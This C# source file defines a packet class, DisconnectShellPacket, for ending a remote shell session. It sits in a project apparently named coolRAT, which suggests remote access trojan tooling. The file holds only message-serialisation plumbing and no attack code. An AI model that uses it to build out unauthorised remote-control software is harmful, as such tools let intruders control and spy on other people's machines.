using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class DisconnectShellPacket : Packet
    {
        public Guid ShellUniqueId;

        public DisconnectShellPacket(Guid clientUniqueId, Guid shellUniqueId) : base(clientUniqueId)
        {
            ShellUniqueId = shellUniqueId;
            Type = "DisconnectShellPacket";
        }

        public static new DisconnectShellPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<DisconnectShellPacket>(packet_string);
        }
    }
}
